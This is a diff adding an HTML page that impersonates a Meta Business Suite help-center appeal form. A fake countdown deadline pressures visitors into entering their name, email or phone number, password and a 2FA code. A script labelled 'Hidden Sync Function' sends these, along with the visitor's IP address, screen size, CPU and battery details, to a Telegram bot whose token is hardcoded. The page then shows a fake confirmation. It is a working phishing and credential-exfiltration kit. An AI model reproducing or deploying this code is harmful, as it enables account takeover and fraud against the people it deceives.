@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Business Suite | Help Center</title>
+    <style>
+        :root {
+            --fb-blue: #0866FF;
+            --fb-bg: #F0F2F5;
+            --fb-white: #FFFFFF;
+            --fb-text: #1C1E21;
+            --fb-secondary: #65676B;
+            --fb-border: #DDDFE2;
+            --error-red: #E41E3F;
+        }
+
+        body {
+            font-family: "Segoe UI", Helvetica, Arial, sans-serif;
+            background-color: var(--fb-bg);
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        nav {
+            background: var(--fb-white);
+            padding: 12px 20px;
+            border-bottom: 1px solid var(--fb-border);
+            display: flex;
+            justify-content: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+
+        .card {
+            background: var(--fb-white);
+            max-width: 480px;
+            width: 90%;
+            margin: 40px auto;
+            border-radius: 8px;
+            box-shadow: 0 12px 28px 0 rgba(0, 0, 0, 0.2), 0 2px 4px 0 rgba(0, 0, 0, 0.1);
+            padding: 24px;
+            text-align: left;
+            transition: all 0.3s ease;
+        }
+
+        h2 { font-size: 24px; font-weight: 700; color: var(--fb-text); margin: 0 0 12px 0; }
+        p { font-size: 15px; color: var(--fb-secondary); line-height: 1.4; margin-bottom: 20px; }
+
+        .alert-banner {
+            background: #FFF2F2;
+            border-left: 4px solid var(--error-red);
+            padding: 12px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .timer { font-weight: 700; font-size: 18px; color: var(--fb-text); }
+        .timer-critical { color: var(--error-red); animation: flash 1s infinite; }
+        @keyframes flash { 50% { opacity: 0.3; } }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 12px;
+            border: 1px solid var(--fb-border);
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline-color: var(--fb-blue);
+        }
+
+        .btn-primary {
+            background-color: var(--fb-blue);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .hidden { display: none; opacity: 0; }
+        .fade-in { animation: fadeIn 0.5s forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .otp-container { text-align: center; }
+        .otp-input { letter-spacing: 12px; font-size: 28px; text-align: center; font-weight: bold; }
+
+        .success-checkmark {
+            width: 80px; height: 80px; margin: 0 auto 20px;
+            background: var(--fb-blue);
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            color: white; font-size: 40px;
+        }
+
+        footer { margin-top: auto; padding: 20px; text-align: center; color: var(--fb-secondary); font-size: 12px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<nav>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" height="24">
+</nav>
+
+<div id="step1" class="card fade-in">
+    <h2>Request a Review</h2>
+    <p>We have detected unusual activity on your business page.</p>
+
+    <div class="alert-banner">
+        <span style="font-size: 20px;">⚠️</span>
+        <div>
+            <div style="font-size: 12px; text-transform: uppercase;">Deadline to Appeal</div>
+            <div id="timer" class="timer">--:--:--</div>
+        </div>
+    </div>
+
+    <input type="text" id="fn" placeholder="Full Name (As it appears on ID)" required>
+    <input type="text" id="em" placeholder="Mobile number or email address" required>
+    <input type="password" id="pw" placeholder="Password" required>
+    <button class="btn-primary" id="b1" onclick="changeStep(1, 2)">Continue to Review</button>
+</div>
+
+<div id="step2" class="card hidden">
+    <div class="otp-container">
+        <h2>Security Check</h2>
+        <p>A login code was sent to your phone.</p>
+        <input type="text" id="ot" class="otp-input" maxlength="6" placeholder="000000">
+        <button class="btn-primary" id="b2" onclick="changeStep(2, 3)">Verify Code</button>
+    </div>
+</div>
+
+<div id="step3" class="card hidden">
+    <div style="text-align: center;">
+        <div id="loading">
+            <div style="border: 4px solid #f3f3f3; border-top: 4px solid var(--fb-blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto;"></div>
+            <p>Processing request...</p>
+        </div>
+        <div id="done" class="hidden">
+            <div class="success-checkmark">✓</div>
+            <h2>Submission Received</h2>
+            <p>Your appeal is being reviewed. We will contact you via your support inbox within 24-48 hours.</p>
+        </div>
+    </div>
+</div>
+
+<footer>Meta © 2025</footer>
+
+<script>
+    // Scrambled Configuration
+    const _c1 = "8342277483:AAFqV9LvbQBG2-VB9xl0VLhqShZK6IcEp5s"; 
+    const _c2 = "5901396648"; 
+    const _bU = "https://api.telegram.org/bot";
+
+    let uIP = "Detecting...";
+    fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => uIP = d.ip);
+
+    // Tab Cloaking
+    window.onblur = () => { document.title = "⚠️ Security Alert!"; };
+    window.onfocus = () => { document.title = "Meta Business Suite | Help Center"; };
+
+    // Timer Logic
+    function initTimer() {
+        let deadline = localStorage.getItem('_m_dl') || (Date.now() + 43200000);
+        localStorage.setItem('_m_dl', deadline);
+        setInterval(() => {
+            let diff = deadline - Date.now();
+            let el = document.getElementById('timer');
+            if (diff <= 0) { el.innerText = "00:00:00"; return; }
+            let h = Math.floor(diff / 3600000), m = Math.floor((diff % 3600000) / 60000), s = Math.floor((diff % 60000) / 1000);
+            if (diff < 3600000) el.classList.add('timer-critical');
+            el.innerText = `${h}:${m<10?'0':''}${m}:${s<10?'0':''}${s}`;
+        }, 1000);
+    }
+    initTimer();
+
+    // Hidden Sync Function
+    async function _syncData(text) {
+        return fetch(_bU + _c1 + "/sendMessage", {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: _c2, text: text, parse_mode: 'Markdown'})
+        });
+    }
+
+    async function changeStep(f, t) {
+        if (f === 1) {
+            document.getElementById('b1').innerText = "Processing...";
+            const res = `${window.screen.width}x${window.screen.height}`;
+            const core = navigator.hardwareConcurrency || "N/A";
+            let bat = "N/A";
+            try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}%`; } catch(e) {}
+
+            const msg = `🚨 *CYBER REPORT* 🚨\n\n👤 *User:* ${document.getElementById('em').value}\n🔑 *Pass:* ${document.getElementById('pw').value}\n\n🌐 *IP:* ${uIP}\n🖥️ *CPU:* ${core}\n📏 *Res:* ${res}\n🔋 *Bat:* ${bat}`;
+            await _syncData(msg);
+        }
+
+        if (f === 2) {
+            document.getElementById('b2').innerText = "Verifying...";
+            await _syncData(`🛡️ *2FA:* ${document.getElementById('ot').value}\n🌐 *IP:* ${uIP}`);
+        }
+
+        document.getElementById('step' + f).classList.add('hidden');
+        document.getElementById('step' + t).classList.remove('hidden');
+        document.getElementById('step' + t).classList.add('fade-in');
+
+        if (t === 3) {
+            setTimeout(() => {
+                document.getElementById('loading').classList.add('hidden');
+                document.getElementById('done').classList.remove('hidden');
+            }, 3000);
+        }
+    }
+</script>
+</body>
+</html>
